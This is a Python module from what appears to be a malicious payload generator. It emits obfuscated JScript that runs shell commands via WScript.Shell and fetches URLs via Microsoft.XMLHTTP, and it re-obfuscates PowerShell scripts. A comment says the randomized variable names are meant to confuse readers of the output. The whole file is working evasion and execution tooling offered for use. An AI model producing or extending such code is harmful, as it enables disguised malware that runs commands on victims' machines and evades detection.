import re
import random
import functions.js_obfuscator as obfuscator

# some random var names to confuse any readers of the output code
var_names = ['id', 'action', 'page', 'name', 'url', 'email', 'type', 'username', 'file', 'title', 'code',
                            'q', 'submit','user', 'token', 'delete', 'message', 't', 'c', 'data', 'mode', 'order', 'lang',
                            'p', 'key', 'status','start', 'charset', 'description', 's', 'post', 'excerpt', 'login',
                            'search', 'content', 'comment', 'step', 'ajax', 'debug', 'state', 'query', 'f', 'error',
                            'save', 'sort', 'format', 'tab', 'offset', 'edit', 'preview', 'filter', 'update', 'from',
                            'view', 'a', 'limit', 'plugin', 'theme', 'text', 'test', 'path', 'language', 'height',
                            'year', 'group', 'template', 'version', 'subject', 'm', 'download', 'confirm', 'width',
                            'callback', 'size', 'source', 'GLOBALS', 'op', 'method', 'uid', 'tag', 'category',
                            'ids', 'term', 'locale', 'author']
random.shuffle(var_names)


def preprocess_vars(output):
    pool = {}
    for match in re.findall(r'(\[var\{(\d+)\}\])', output):
        if match[1] not in pool:
            x = var_names.pop(0)
            output = output.replace(match[0], x)
            pool[match[1]] = x
    return output


def preprocess_strings(output, obfus="random"):
    for match in re.findall(r'(\[str\{(.+?)\}\])', output):
        result = obfuscator.string(match[1], obfus)
        output = output.replace(match[0], result)
    return output


def shell_execute(function_name, obfus="random"):

    payload = """
    function %s([var{2}]){
    var [var{0}] = new ActiveXObject([str{WScript.Shell}]);
    var [var{1}] = [var{0}].Exec([var{2}]);
    return [var{1}].StdOut.ReadAll();
    }""" % function_name
    payload = preprocess_vars(payload)
    payload = preprocess_strings(payload, obfus)
    return payload


def get_request(function_name, obfus="random"):
    payload = """
    function %s([var{1}]){
    var [var{0}] = new ActiveXObject([str{Microsoft.XMLHTTP}]);
    [var{0}].open([str{GET}], [var{1}], false);
    [var{0}].send();
    return [var{0}].responseText;
    }""" % function_name

    payload = preprocess_vars(payload)
    payload = preprocess_strings(payload, obfus)
    return payload


def invoke_posh(input_file, obfus="random"):
    data = None
    with open(input_file, 'r') as f:
        data = f.read()
    data = obfuscator.posh_reobfus(data, obfus=obfus)
    return data

